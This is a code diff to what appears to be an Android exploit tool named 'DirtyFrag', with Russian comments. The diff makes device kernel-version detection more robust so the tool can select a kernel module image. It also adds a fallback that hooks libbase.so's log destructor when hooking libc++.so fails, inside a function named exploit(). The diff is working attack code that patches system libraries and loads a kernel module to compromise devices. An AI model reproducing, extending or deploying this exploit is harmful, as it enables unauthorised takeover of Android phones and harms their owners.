@@ -18,6 +18,7 @@
 #include <errno.h>
 #include <sched.h>
 #include <sys/syscall.h>
+#include <sys/system_properties.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/uio.h>
@@ -305,14 +306,40 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
     return fb;
 }
 
-static int read_device_versions(int *andr, int *major, int *minor) {
+static int read_device_versions(int *kmi, int *major, int *minor) {
     struct utsname u;
+    char vendor[92] = { 0 }, system_release[92] = { 0 };
+    int v = 0, s = 0;
+
     if (uname(&u) != 0) return -1;
     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
+
+    /* DirtyFrag 1.18: таблица ko индексируется по GKI-уровню — токен
+     * androidNN из uname, а не по видимой версии Android. uname читаем
+     * первым, свойства — строго фолбэк для вендоров, бросающих токен. */
     const char *m = strstr(u.release, "android");
-    if (!m) return -1;
-    *andr = atoi(m + 7);
-    return (*andr > 0) ? 0 : -1;
+    if (m) {
+        *kmi = atoi(m + strlen("android"));
+        return (*kmi > 0) ? 0 : -1;
+    }
+
+    printf("uname -r is missing the Android version, trying system properties\n");
+    __system_property_get("ro.vendor.build.version.release", vendor);
+    __system_property_get("ro.build.version.release", system_release);
+    if (sscanf(vendor, "%d", &v) != 1 || v <= 0) v = 0;
+    if (sscanf(system_release, "%d", &s) != 1 || s <= 0) s = 0;
+    printf("  ro.vendor.build.version.release = %s\n", vendor[0] ? vendor : "<unset>");
+    printf("  ro.build.version.release        = %s\n",
+           system_release[0] ? system_release : "<unset>");
+    if (!v && !s) {
+        printf("neither property gave a usable Android version\n");
+        return -1;
+    }
+    /* Вендорское число двигается вместе с GKI-уровнем (boot+vendor идут в
+     * паре), системное — нет (может читаться 17 на android15-6.6 ядре),
+     * поэтому вендорское выигрывает, системное — последний фолбэк. */
+    *kmi = v ? v : s;
+    return 0;
 }
 
 /* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
@@ -536,10 +563,18 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
-                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+    /* DirtyFrag 1.18: выбор цели возвращает 1 ДО записи — деструктор
+     * логов libbase имеет ту же семантику вызова, фолбэк безопасен. */
+    int hook_rc = patch_hook("/system/lib64/libc++.so",
+                             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+    if (hook_rc == 1)
+        hook_rc = patch_hook("/system/lib64/libbase.so",
+                             "_ZN7android4base10LogMessageD1Ev",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+    if (hook_rc) goto done;
 
     rc = 2;
     usleep(500000);
